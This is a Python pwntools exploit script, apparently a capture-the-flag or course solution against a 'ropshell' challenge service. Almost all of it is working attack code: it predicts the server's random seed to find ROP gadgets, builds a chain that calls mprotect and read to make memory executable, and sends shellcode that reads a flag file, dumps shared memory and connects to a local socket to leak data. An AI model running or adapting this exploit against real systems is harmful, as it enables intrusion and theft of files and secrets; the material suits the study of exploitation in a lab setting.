#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
from ctypes import *

libc = ctypes.CDLL('libc.so.6')
context.arch = 'amd64'
context.os = 'linux'


def solve_pow(r):
    prefix = r.recvline().decode().split("'")[1]
    print("solving pow ...")
    solved = b''
    for i in range(1000000000):
        h = hashlib.sha1((prefix + str(i)).encode()).hexdigest()
        if h[:6] == '000000':
            solved = str(i).encode()
            print("solved =", solved)
            break
    print("done.")

    r.sendlineafter(b'string S: ', base64.b64encode(solved))

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    solve_pow(r)

list = r.recvuntil(b'second(s)')
list = list.decode().split("\n")

#seed
stamp = list[2].split(" ")
# print(stamp[3])
libc.srand(int(stamp[3]))

#base addr
addr = list[3].split(" ")
# print(addr[5])
sysaddr = int(addr[5],16)


mprotect1 = asm('pop rax; ret')
mprotect2 = asm('pop rdi; ret')
mprotect3 = asm('pop rsi; ret')
mprotect4 = asm('pop rdx; ret')

LEN_CODE = (10*0x10000)
for i in range(0, int(LEN_CODE/4)):
    asm_value = (ctypes.c_uint((libc.rand()<<16) | (libc.rand() & 0xffff))).value
    if i == 0:
        asm_byte = asm_value.to_bytes(4, byteorder='little')
    else :
        asm_byte += asm_value.to_bytes(4, byteorder='little')

ret1 = asm_byte.find(mprotect1)#pop rax;ret --> 58c3
ret2 = asm_byte.find(mprotect2)
ret3 = asm_byte.find(mprotect3)
ret4 = asm_byte.find(mprotect4)

if ret1 != -1:
    maddr1 = sysaddr +ret1
    print("pop rax; ret  " + hex(maddr1))
else:
    maddr1 = 0
    
if ret2 != -1:
    maddr2 = sysaddr +ret2
    print("pop rdi; ret  "+hex(maddr2))
else:
    maddr2 = 0 

if ret3 != -1:
    maddr3 = sysaddr + ret3
    print("pop rsi; ret  "+hex(maddr3))
else:
    maddr3 = 0 

if ret4 != -1:
    maddr4 = sysaddr + ret4
    print("pop rdx; ret  "+hex(maddr4))
else:
    maddr4 = 0 

sys = ctypes.c_uint(libc.rand() % (int(LEN_CODE/4 - 1)))
target = sysaddr + sys.value*4
print("syscall  "+hex(target))


#read --> sys_open + sys_sendfile to stdout
read = asm("mov rax, 2; mov DWORD PTR [rsp], 0x414c462f; mov WORD PTR [rsp+0x4], 0x47; mov rsi, 0; mov rdi, rsp; syscall;\
            mov rsi, rax; mov rax, 40; mov rdi, 1; mov rdx, 0; mov r10, 0x45; syscall")
sh = read

#sharemem --> sys_shmget + sys_shmat + sys_write to stdout
share_mem = asm("mov rax, 29; mov rdi, 0x1337;mov rsi, 4096; mov rdx, 0;syscall;\
                 mov rdi, rax; mov rax, 30; mov rsi, 0; mov rdx, 4096; syscall;\
                 mov rsi, rax; mov rax, 1; mov rdi, 1; mov rdx, 0x45; syscall")
sh += share_mem

#con --> sys_socket + sys_connect + sys_recfrom + sys_write to stdout
socket = asm("mov rax, 41; mov rdi, 2; mov rsi, 1; mov rdx, 0; syscall;")
sh += socket

con = asm("mov rdi, rax; mov rax, 0x2a; mov rsi, rsp; mov rdx, 0x10; push rdi; pop r10;\
           mov WORD PTR [rsp], 0x02; mov WORD PTR [rsp+0x2], 0x3713; mov DWORD PTR [rsp+0x4], 0x0100007f; \
           syscall")
sh += con

rec = asm("mov rax, 45; mov rdi, r10; mov rsi, rsp; mov rdx, 0x43; mov r10, 0; syscall")
sh += rec

# s = asm("mov QWORD PTR [rsp], rax") #check
# sh += s
write_con = asm("mov rax, 1; mov rdi, 1; mov rsi, rsp; mov rdx, 0x43; syscall")
sh += write_con
# shellcode = shellcraft.write(1, 'rsp', 0x43)
# sh += asm(shellcode)


# exit --> sys_exit
ex = asm("mov rdi,37; mov rax,60;syscall")
sh += ex

reply = flat(
    sh   
)

# print("len of reply " + str(len(reply)))
ans = flat(
    maddr1,#mprotect
    10,
    maddr2,
    p64(sysaddr),
    maddr3,
    p64(0x2000),
    maddr4,
    p64(7),
    target,
    maddr1,#read
    p64(0),
    maddr2,
    p64(0),
    maddr3,
    p64(sysaddr),
    maddr4,
    p64(len(reply)),
    target,
    p64(sysaddr)# jmp codeint
)


# print(ans)
r.send(ans)
# print(reply)
r.send(reply)
r.interactive()